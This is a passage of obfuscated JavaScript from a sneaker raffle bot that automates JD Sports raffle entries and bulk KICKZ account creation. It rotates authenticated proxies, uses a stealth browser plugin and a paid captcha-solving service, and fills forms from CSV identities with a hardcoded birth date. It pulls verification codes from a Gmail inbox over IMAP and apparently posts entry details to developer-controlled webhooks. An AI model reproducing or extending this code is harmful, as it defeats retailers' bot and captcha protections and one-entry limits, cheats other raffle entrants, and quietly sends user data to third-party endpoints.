                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x2e94ed['name'] + ']\x20Task\x20' + (_0x56b4ef + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c646b + '\x20/\x205)')), _0x56b4ef = _0x56b4ef - 0x1, _0x2c646b = _0x2c646b + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x31deb2, _0x13f58f, _0x28e9a4) {
                var _0x4ae595 = ![], _0xef68fa = ![];
                if (_0x4b1e6b['captchaKey'] == '' || _0x4b1e6b['captchaKey'] == undefined)
                    return console['log'](_0x4fb298['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x4b1e6b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x3c11a3 = 0x0; _0x3c11a3 < _0x13f58f['length']; _0x3c11a3++) {
                    if (_0x535d47 != 'yes')
                        var _0x535d47 = '', _0x47acf9 = 0x0;
                    var _0x31c12d, _0x5a9561 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x13f58f[_0x3c11a3]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x13f58f[_0x3c11a3]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x3d4e83
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x4b1e6b['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x1701ba
                            }
                        ]
                    }];
                    const _0x57ef97 = { 'embeds': _0x5a9561 };
                    _0x39f641(_0x31deb2['name'] + '\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20/\x20' + _0x13f58f['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                    try {
                        await _0x46b8ee(_0x13f58f, _0x3c11a3);
                    } catch {
                        _0x535d47 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x3a0ec5 = await _0x54f36f(_0x13f58f[_0x3c11a3], _0x31deb2, 'dev', ![]), _0x14017f = await _0x54f36f(_0x13f58f[_0x3c11a3], _0x31deb2, 'pub', ![]);
                    const _0x6b6d39 = {
                        'succesDEVMSG': { 'embeds': [_0x3a0ec5] },
                        'succesPUBMSG': { 'embeds': [_0x14017f] }
                    };
                    if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                        try {
                            await _0x1690f0(_0x4b1e6b['webhook'], _0x6b6d39['succesDEVMSG']);
                        } catch {
                        }
                    await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x6b6d39['succesDEVMSG']), await _0x590479(0xc8);
                    try {
                        await _0x1690f0(_0x4807c3, _0x6b6d39['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x13f58f[_0x3c11a3]['Email'] == '' || _0x13f58f[_0x3c11a3]['Url'] == '' || _0x13f58f[_0x3c11a3]['FirstName'] == '' || _0x13f58f[_0x3c11a3]['LastName'] == '') {
                        console['log'](_0x4786af() + '\x20[' + _0x514297[taskModule]['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4b1e6b['useRandomProxy'] = ![])
                        var _0x31349c = _0x28e9a4[_0x3c11a3]['split'](':');
                    else
                        var _0x36338c = Math['round'](Math['random']() * (_0x28e9a4['length'] - 0x1)), _0x31349c = _0x28e9a4[_0x36338c]['split'](':');
                    var _0x3e2edc;
                    try {
                        _0x3e2edc = await _0x145da3['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31349c[0x0] + ':' + _0x31349c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x3e2edc = await _0x145da3['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x31349c[0x0] + ':' + _0x31349c[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x26707c = await _0x3e2edc['newPage']();
                        await _0x26707c['authenticate']({
                            'username': '' + _0x31349c[0x2],
                            'password': '' + _0x31349c[0x3]
                        }), console['log'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x26707c['setRequestInterception'](!![]), _0x26707c['on']('request', _0x33a779 => {
                            _0x33a779['resourceType']() === 'image' || _0x33a779['resourceType']() === 'font' || _0x33a779['resourceType']() === 'media' ? _0x33a779['abort']() : _0x33a779['continue']();
                        });
                        try {
                            await _0x26707c['goto']('' + _0x13f58f[_0x3c11a3]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x26707c['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x26707c['type']('#comp_firstname', '' + _0x13f58f[_0x3c11a3]['FirstName']), await _0x26707c['waitForSelector']('#comp_lastname'), await _0x26707c['type']('#comp_lastname', '' + _0x13f58f[_0x3c11a3]['LastName']), await _0x26707c['waitForSelector']('#comp_email'), await _0x26707c['type']('#comp_email', '' + _0x13f58f[_0x3c11a3]['Email']), await _0x26707c['waitForSelector']('#comp_paypalemail'), await _0x26707c['type']('#comp_paypalemail', '' + _0x13f58f[_0x3c11a3]['Email']), await _0x26707c['waitForSelector']('#comp_mobile_end'), await _0x26707c['type']('#comp_mobile_end', '' + _0x13f58f[_0x3c11a3]['Phone']), await _0x26707c['waitForSelector']('#comp_dob'), await _0x26707c['type']('#comp_dob', '08/09/1992'), console['log'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x13f58f[_0x3c11a3]['Size'] == 'RANDOM') {
                            const _0x48356a = await _0x26707c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x109fbd => {
                                return _0x109fbd['map'](_0x49cbcc => _0x49cbcc['value']);
                            });
                            var _0x13fa18 = Math['round'](Math['random']() * (_0x48356a['length'] - 0x2));
                            await _0x26707c['select']('#shoesize', _0x48356a[_0x13fa18 + 0x1]), await _0x590479(0x3e8);
                        } else {
                            const _0x4e92ed = await _0x26707c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x21a00f => {
                                return _0x21a00f['map'](_0x3dd9e1 => _0x3dd9e1['innerText']);
                            }), _0x2577d0 = await _0x26707c['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x53930b => {
                                return _0x53930b['map'](_0x1ff63f => _0x1ff63f['value']);
                            });
                            var _0x23febe = _0x13f58f[_0x3c11a3]['Size'];
                            for (var _0x2dff85 = 0x1; _0x2dff85 < _0x2577d0['length']; _0x2dff85++) {
                                var _0x7186d6 = _0x4e92ed[_0x2dff85]['split']('\x20')[0x0];
                                if (_0x7186d6 == _0x23febe) {
                                    await _0x26707c['select']('#shoesize', _0x2577d0[_0x2dff85]);
                                    break;
                                } else {
                                    if (_0x2dff85 + 0x1 == _0x2577d0['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x26707c['waitForSelector']('#comp_address1'), await _0x26707c['type']('#comp_address1', _0x13f58f[_0x3c11a3]['Address1'] + '\x20' + _0x13f58f[_0x3c11a3]['HouseNumber']), await _0x26707c['waitForSelector']('#comp_address2'), await _0x26707c['type']('#comp_address2', '' + _0x13f58f[_0x3c11a3]['Address2']), await _0x26707c['waitForSelector']('#comp_address2'), await _0x26707c['type']('#comp_address3', '' + _0x13f58f[_0x3c11a3]['City']), await _0x26707c['waitForSelector']('#comp_postcode'), await _0x26707c['type']('#comp_postcode', '' + _0x13f58f[_0x3c11a3]['Zip']), console['log'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x590479(0x4b0), await _0x26707c['click']('label#emailhold'), await _0x590479(0x5dc), await _0x26707c['click']('#preauth_tandc_email\x20>\x20label'), await _0x590479(0x5dc), await _0x26707c['click']('#submit');
                        try {
                            await _0x26707c['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20' + _0x4fb298['blue']('Awaiting\x20Paypal\x20Payment')), _0x3e2edc['on']('targetcreated', async _0x13f367 => {
                            if (_0x13f367['type']() === 'page') {
                                const _0x463376 = await _0x13f367['page']();
                                async function _0x5ce1cb() {
                                    try {
                                        await _0x26707c['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0xef68fa = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x2550ed() {
                                    try {
                                        await _0x26707c['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x4ae595 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x2550ed(), _0x5ce1cb(), await _0x590479(0x493e0);
                            }
                        });
                        async function _0x43a0d4() {
                            for (let _0x405cd5 = 0x0; _0x405cd5 < 0x12c; _0x405cd5++) {
                                if (_0x4ae595 == !![]) {
                                    _0x535d47 = 'no', _0x491fd3(_0x13f58f[_0x3c11a3], _0x31deb2), console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '')
                                        try {
                                            await _0x1690f0(_0x4b1e6b['webhook'], _0x6b6d39['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x590479(0xc8), await _0x1690f0(_0x4f7f5d, _0x6b6d39['succesDEVMSG']), await _0x590479(0xc8);
                                    try {
                                        await _0x1690f0(_0x4807c3, _0x6b6d39['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0xef68fa)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x590479(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x590479(0xbb8), await _0x26707c['click']('.zoid-outlet'), await _0x590479(0x7d0), await _0x43a0d4();
                    } catch (_0xccc525) {
                        console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20' + _0xccc525)), _0x31c12d = '' + _0xccc525;
                        var _0x1fcf69 = await _0x54f36f(_0x13f58f[_0x3c11a3], _0x31deb2, 'dev', !![], _0x31c12d);
                        _0x6b6d39['errorDEV'] = { 'embeds': [_0x1fcf69] }, _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0x6b6d39['errorDEV']), await _0x1690f0(_0x874ee1, _0x6b6d39['errorDEV']);
                    } finally {
                        _0x3e2edc && _0x3e2edc['close']();
                        if (_0x535d47 == 'yes' && _0x47acf9 != 0x5 && _0x31c12d != 'Size\x20Not\x20Found') {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x31deb2['name'] + ']\x20Task\x20' + (_0x3c11a3 + 0x1) + '\x20:\x20Retrying\x20(' + _0x47acf9 + '\x20/\x205)')), _0x3c11a3 = _0x3c11a3 - 0x1, _0x47acf9 = _0x47acf9 + 0x1;
                            continue;
                        }
                        _0x535d47 == 'yes' && _0x47acf9 >= 0x5 && (_0x549c32(afew[_0x3c11a3], _0x31deb2), _0x535d47 = 'no', _0x47acf9 = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x447316, _0x42a6ba, _0x3a939a) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xdab6ab = 0x0; _0xdab6ab < _0x42a6ba['length']; _0xdab6ab++) {
                        const _0x45b20c = 'https://www.kickz.com/login';
                        if (_0x51f1e5 != 'yes')
                            var _0x51f1e5 = '', _0x1ab1d6 = 0x0;
                        _0x39f641(_0x447316['name'] + '\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20/\x20' + _0x42a6ba['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        try {
                            await _0x46b8ee(_0x42a6ba, _0xdab6ab);
                        } catch {
                            _0x51f1e5 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x2bf483 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3d4e83
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4b1e6b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1701ba
                                }
                            ]
                        }];
                        const _0x215649 = { 'embeds': _0x2bf483 };
                        var _0x43c3a1 = await _0x54f36f(_0x42a6ba[_0xdab6ab], _0x447316, 'acc', ![]);
                        const _0xd4b78f = { 'succesDEVMSG': { 'embeds': [_0x43c3a1] } };
                        if (_0x42a6ba[_0xdab6ab]['Email'] == '' || _0x42a6ba[_0xdab6ab]['FirstName'] == '' || _0x42a6ba[_0xdab6ab]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x42a6ba[_0xdab6ab]['Password'] == '' && (_0x42a6ba[_0xdab6ab]['Password'] = 'JRaffles23!');
                        if (_0x4b1e6b['useRandomProxy'] = ![])
                            var _0x2697e4 = _0x3a939a[_0xdab6ab]['split'](':');
                        else
                            var _0x564850 = Math['round'](Math['random']() * (_0x3a939a['length'] - 0x1)), _0x2697e4 = _0x3a939a[_0x564850]['split'](':');
                        var _0x8be716;
                        try {
                            _0x8be716 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2697e4[0x0] + ':' + _0x2697e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x8be716 = await _0x145da3['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x2697e4[0x0] + ':' + _0x2697e4[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x1fb5a0 = await _0x8be716['newPage']();
                            await _0x1fb5a0['authenticate']({
                                'username': '' + _0x2697e4[0x2],
                                'password': '' + _0x2697e4[0x3]
                            }), console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Getting\x20Session'), await _0x1fb5a0['setRequestInterception'](!![]), _0x1fb5a0['on']('request', _0x486417 => {
                                _0x486417['resourceType']() === 'image' || _0x486417['resourceType']() === 'font' || _0x486417['resourceType']() === 'media' ? _0x486417['abort']() : _0x486417['continue']();
                            }), await _0x1fb5a0['goto'](_0x45b20c), await _0x590479(0xbb8), console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x1fb5a0['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1fb5a0['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x1fb5a0['waitForSelector']('#button-register'), await _0x590479(0x7d0), await _0x1fb5a0['evaluate'](() => {
                                const _0x311cdc = document['querySelector']('#button-register');
                                _0x311cdc['click']();
                            }), console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x590479(0x1388), await _0x1fb5a0['waitForSelector']('#customer_salutation'), await _0x1fb5a0['select']('#customer_salutation', 'mr'), await _0x590479(0x7d0), await _0x1fb5a0['waitForSelector']('#customer_firstname'), await _0x1fb5a0['type']('#customer_firstname', '' + _0x42a6ba[_0xdab6ab]['FirstName']), await _0x590479(0x352), await _0x1fb5a0['waitForSelector']('#customer_lastname'), await _0x1fb5a0['type']('#customer_lastname', '' + _0x42a6ba[_0xdab6ab]['LastName']), await _0x590479(0x352), await _0x1fb5a0['type']('#email-input', '' + _0x42a6ba[_0xdab6ab]['Email']), await _0x590479(0x352), await _0x1fb5a0['type']('#email-confirm-input', '' + _0x42a6ba[_0xdab6ab]['Email']), await _0x590479(0x352), await _0x1fb5a0['type']('#register-password', '' + _0x42a6ba[_0xdab6ab]['Password']), await _0x590479(0x352), await _0x1fb5a0['type']('#password-confirm', '' + _0x42a6ba[_0xdab6ab]['Password']), await _0x590479(0x352), console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x1fb5a0['click']('#consent'), await _0x590479(0x1f4);
                            const _0x256a8b = await _0x1fb5a0['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x256a8b) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x1fb5a0['click']('#buttonRegister');
                            try {
                                await _0x1fb5a0['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x42a6ba[_0xdab6ab]['Email']), await _0x590479(0x4b0);
                            async function _0xe26eab() {
                                var _0x1558e8, _0x13707e = ![];
                                for (var _0x34ff4b = 0x0; _0x34ff4b < 0x18; _0x34ff4b++) {
                                    async function _0x4d1e22() {
                                        var _0xe9fd84 = new _0x54228e({
                                            'user': _0x4b1e6b['masterMail'],
                                            'password': _0x4b1e6b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x216dc4(_0x49c3e4) {
                                            _0xe9fd84['openBox']('INBOX', ![], _0x49c3e4);
                                        }
                                        _0xe9fd84['once']('ready', function () {
                                            console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x216dc4(function (_0x4e2560, _0x221e95) {
                                                console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x4e2560)
                                                    throw _0x4e2560;
                                                _0xe9fd84['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x45fd95, _0x5399ec) {
                                                    if (!_0x5399ec || !_0x5399ec['length'])
                                                        console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0xe9fd84['end']();
                                                    else {
                                                        var _0x32ffd2 = _0xe9fd84['seq']['fetch'](_0x5399ec, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x32ffd2['on']('message', function (_0x3e7460, _0x247a11) {
                                                            var _0x390421 = '(#' + _0x247a11 + ')\x20';
                                                            _0x3e7460['on']('body', function (_0x49dc96, _0x3bb548) {
                                                                _0x4a3e33(_0x49dc96, (_0x155317, _0x194cc0) => {
                                                                    if (_0x194cc0['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x4cd7bd = _0x194cc0['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x483b5a = _0x4cd7bd[0x1]['split']('<')[0x0];
                                                                        _0x1558e8 = _0x483b5a;
                                                                    }
                                                                });
                                                            }), _0x3e7460['once']('end', function () {
                                                            });
                                                        }), _0x32ffd2['once']('error', function (_0x3bff46) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x32ffd2['once']('end', function () {
                                                            _0xe9fd84['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0xe9fd84['once']('error', function (_0x2dc926) {
                                            console['log'](_0x4fb298['red'](_0x2dc926['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x13707e = !![];
                                        }), _0xe9fd84['once']('end', async function () {
                                        }), _0xe9fd84['connect']();
                                    }
                                    _0x4d1e22(), await _0x590479(0x1388);
                                    if (_0x1558e8)
                                        return _0x1558e8;
                                    if (_0x13707e)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x34ff4b == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xe26eab(), _0x590479(0x320), console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Verifying..'), await _0x1fb5a0['type']('#verificationCode', code), await _0x590479(0x1f4), await _0x1fb5a0['click']('#buttonVerify'), await _0x590479(0x190), await _0x1fb5a0['click']('#buttonVerify'), await _0x590479(0x3e8);
                            try {
                                await _0x1fb5a0['waitForSelector']('div.b-user_greeting'), _0x51f1e5 = 'no', console['log'](_0x4fb298['green'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Account\x20' + _0x42a6ba[_0xdab6ab]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x768c3f['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x42a6ba[_0xdab6ab]['Email'] + ',' + _0x42a6ba[_0xdab6ab]['Password'] + ','), console['log'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Account\x20' + _0x42a6ba[_0xdab6ab]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x4b1e6b['webhook'] != undefined && _0x4b1e6b['webhook'] != '' && await _0x1690f0(_0x4b1e6b['webhook'], _0xd4b78f['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1690f0(_0x48932d, _0xd4b78f['succesDEVMSG']);
                            } catch {
                                _0x51f1e5 = 'no', console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x172554) {
                            console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20' + _0x172554)), _0x2bf483[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x2bf483[0x0]['description'] = '' + _0x172554, await _0x1690f0(_0x874ee1, _0x215649), _0x51f1e5 = 'yes';
                        } finally {
                            _0x8be716 && _0x8be716['close']();
                            if (_0x51f1e5 == 'yes' && _0x1ab1d6 != 0x5) {
                                console['log'](_0x4fb298['red'](_0x4786af() + '\x20[' + _0x447316['name'] + ']\x20Task\x20' + (_0xdab6ab + 0x1) + '\x20:\x20Retrying\x20(' + _0x1ab1d6 + '\x20/\x205)')), _0xdab6ab = _0xdab6ab - 0x1, _0x1ab1d6 = _0x1ab1d6 + 0x1;
                                continue;
                            }
                            _0x51f1e5 == 'yes' && _0x1ab1d6 >= 0x5 && (_0x549c32(_0x42a6ba[_0xdab6ab], _0x447316), _0x51f1e5 = 'no', _0x1ab1d6 = 0x0), console['log']('Waiting\x20for\x20' + _0x4b1e6b['delay'] + '\x20ms'), await _0x590479(_0x4b1e6b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x1ef492, _0x26cfe4, _0x5682c7) {
                    _0x145da3['use'](_0x109835()), _0x145da3['use'](_0x29f0f6({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4b1e6b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x4d7485 = 0x0; _0x4d7485 < _0x26cfe4['length']; _0x4d7485++) {
                        var _0x2850f3;
                        if (_0x3b53a0 != 'yes')
                            var _0x3b53a0 = '', _0x43f8d0 = 0x0;
                        _0x39f641(_0x1ef492['name'] + '\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20/\x20' + _0x26cfe4['length'] + '\x20||\x20File:\x20' + _0x4c637b + '\x20Proxies:\x20' + _0x1792f9);
                        var _0x456f33 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x3d4e83
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x26cfe4[_0x4d7485]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x26cfe4[_0x4d7485]['Size']
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x4b1e6b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x1701ba
                                }
                            ]
                        }], _0x545973 = await _0x54f36f(_0x26cfe4[_0x4d7485], _0x1ef492, 'dev', ![]), _0x1a94d5 = await _0x54f36f(_0x26cfe4[_0x4d7485], _0x1ef492, 'pub', ![]);
                        const _0x194912 = {
                            'succesDEVMSG': { 'embeds': [_0x545973] },
                            'succesPUBMSG': { 'embeds': [_0x1a94d5] }
                        };
                        try {
                            await _0x46b8ee(_0x26cfe4, _0x4d7485);
                        } catch {
                            _0x3b53a0 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x26cfe4[_0x4d7485]['Email'] == '' || _0x26cfe4[_0x4d7485]['Password'] == '' || _0x26cfe4[_0x4d7485]['FirstName'] == '' || _0x26cfe4[_0x4d7485]['LastName'] == '') {
                            console['log'](_0x4786af() + '\x20[' + _0x1ef492['name'] + ']\x20Task\x20' + (_0x4d7485 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
